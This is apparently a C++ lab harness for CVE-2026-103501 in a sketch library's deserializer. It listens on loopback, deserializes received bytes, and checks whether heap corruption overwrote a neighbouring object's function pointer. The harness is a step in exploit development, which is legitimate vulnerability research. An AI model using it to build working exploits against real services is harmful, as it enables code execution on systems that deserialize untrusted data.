// Lab-only typed-object adjacency probe for CVE-2026-103501.
// Allocates a live typed object BEFORE deserialization, calls public
// hll_sketch::deserialize on verbatim pinned 5.2.0 from a loopback socket,
// then allocates a second typed object AFTER deserialization. Prints where
// both objects landed and what their fields contain. No library source is
// copied, patched or shimmed; no call is made through any overwritten field.
#include "hll.hpp"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <exception>
#include <vector>
using namespace datasketches;

struct LiveVictim {
  uint64_t marker;
  void (*fp)();
  uint64_t tail[4];
};
static void benign_marker() { std::printf("MARKER_CALLED\n"); }

// Default-initialised POD: neither field is written by this consumer.
struct PodRequest {
  uint64_t a;
  uint64_t b;
};

static bool read_exact(int fd, uint8_t* dst, size_t n) {
  size_t done = 0;
  while (done < n) {
    const ssize_t r = ::recv(fd, dst + done, n - done, 0);
    if (r <= 0) return false;
    done += static_cast<size_t>(r);
  }
  return true;
}

int main(int argc, char** argv) {
  const int port = argc > 1 ? std::atoi(argv[1]) : 38161;

  LiveVictim* before = new LiveVictim;
  before->marker = 0x1122334455667788ULL;
  before->fp = &benign_marker;
  for (int i = 0; i < 4; ++i) before->tail[i] = 0x3333333333333333ULL;
  std::printf("VICTIM_BEFORE_ADDR=%p marker=%016lx fp=%p\n",
              (void*)before, before->marker, (void*)before->fp);
  std::fflush(stdout);

  const int ls = ::socket(AF_INET, SOCK_STREAM, 0);
  if (ls < 0) { std::perror("socket"); return 2; }
  int one = 1;
  ::setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  sockaddr_in addr;
  std::memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(static_cast<uint16_t>(port));
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);  // 127.0.0.1 only
  if (::bind(ls, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) { std::perror("bind"); return 2; }
  if (::listen(ls, 1) < 0) { std::perror("listen"); return 2; }
  std::printf("SERVICE_LISTEN port=%d pid=%d\n", port, static_cast<int>(::getpid()));
  std::fflush(stdout);

  const int cs = ::accept(ls, nullptr, nullptr);
  if (cs < 0) { std::perror("accept"); return 2; }
  uint8_t lenbuf[4];
  if (!read_exact(cs, lenbuf, 4)) { std::printf("SERVICE_IMAGE rv=short_length\n"); return 2; }
  uint32_t len = 0;
  std::memcpy(&len, lenbuf, 4);
  len = ntohl(len);
  std::printf("SERVICE_IMAGE bytes=%u\n", len);
  std::fflush(stdout);
  if (len == 0 || len > (1u << 20)) { std::printf("SERVICE_IMAGE rv=bad_length\n"); return 2; }

  std::vector<uint8_t> buf(len);
  if (!read_exact(cs, buf.data(), len)) { std::printf("SERVICE_IMAGE rv=short_body\n"); return 2; }
  try {
    const auto sk = hll_sketch::deserialize(buf.data(), buf.size());
    std::printf("SERVICE_DESERIALIZE rv=ok estimate=%f\n", sk.get_estimate());
  } catch (const std::exception& e) {
    std::printf("SERVICE_DESERIALIZE rv=exception what=%s\n", e.what());
  }
  std::fflush(stdout);

  // Carved from the (possibly corrupted) top chunk, never from a live object
  // that existed before deserialization. Fields are read, never called.
  PodRequest* req = new PodRequest;
  std::printf("REQUEST_ADDR=%p a=%016lx b=%016lx\n",
              (void*)req, req->a, req->b);
  std::printf("VICTIM_AFTER_ADDR=%p marker=%016lx fp=%p tail0=%016lx\n",
              (void*)before, before->marker, (void*)before->fp, before->tail[0]);
  std::fflush(stdout);

  ::close(cs);
  ::close(ls);
  std::printf("SERVICE_EXIT\n");
  return 0;
}
